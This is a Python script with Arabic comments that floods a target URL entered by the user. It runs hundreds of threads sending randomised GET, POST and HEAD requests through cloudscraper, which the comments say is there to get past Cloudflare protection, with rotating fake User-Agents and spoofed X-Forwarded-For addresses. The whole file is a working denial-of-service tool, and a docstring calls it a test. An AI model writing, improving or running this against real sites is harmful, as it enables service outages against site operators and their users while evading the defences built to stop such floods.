import cloudscraper
import threading
from queue import Queue
import random
import time
import logging
import requests
from fake_useragent import UserAgent

# إعداد تسجيل الأحداث (logging)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# قائمة عناوين URL المستهدفة
urls = Queue()

# توليد عنوان IP عشوائي
def get_random_ip():
    """
    توليد عنوان IP عشوائي لاستخدامه في رأس الطلب.
    """
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# الحصول على User-Agent عشوائي
def get_random_user_agent():
    """
    الحصول على User-Agent عشوائي باستخدام fake_useragent.
    """
    ua = UserAgent()
    return ua.random

# إرسال الطلبات
def send_requests():
    """
    إرسال طلبات إلى الهدف مع تخطي حماية Cloudflare.
    """
    scraper = cloudscraper.create_scraper()  # إنشاء كائن Scraper
    while not urls.empty():
        url = urls.get()
        for attempt in range(3):  # إعادة المحاولة 3 مرات في حالة الفشل
            try:
                headers = {
                    "User-Agent": get_random_user_agent(),
                    "Accept-Language": "en-US,en;q=0.9",
                    "Referer": "https://www.google.com/",
                    "X-Forwarded-For": get_random_ip(),
                }
                method = random.choice(["GET", "POST", "HEAD"])
                if method == "POST":
                    response = scraper.post(url, data={"dummy": "data"}, headers=headers, timeout=5)
                elif method == "HEAD":
                    response = scraper.head(url, headers=headers, timeout=5)
                else:
                    response = scraper.get(url, headers=headers, timeout=5)
                logging.info(f"{method} request sent to {url} | Status: {response.status_code}")
                break  # إذا نجح الطلب، توقف عن إعادة المحاولة
            except Exception as e:
                logging.error(f"Error: {str(e)} | Attempt {attempt + 1} of 3 | Retrying...")
                time.sleep(1)  # انتظر قبل إعادة المحاولة
        urls.task_done()

# الإعداد الرئيسي
def main():
    """
    الإعداد الرئيسي للاختبار.
    """
    target = input("Enter the target URL (with http/https): ").strip()
    thread_count = int(input("Enter the number of threads (recommended: 100-1000): "))
    request_count = int(input("Enter the total number of requests (recommended: 1000-10000): "))

    # التحقق من صحة المدخلات
    if thread_count <= 0 or request_count <= 0:
        logging.error("Invalid input. The number of threads and requests must be greater than 0.")
        return

    # ملء قائمة الطلبات
    for _ in range(request_count):
        urls.put(target)

    threads = []

    # إنشاء وتشغيل الخيوط
    for _ in range(thread_count):
        thread = threading.Thread(target=send_requests)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # انتظار انتهاء جميع الطلبات
    urls.join()

if __name__ == "__main__":
    main()
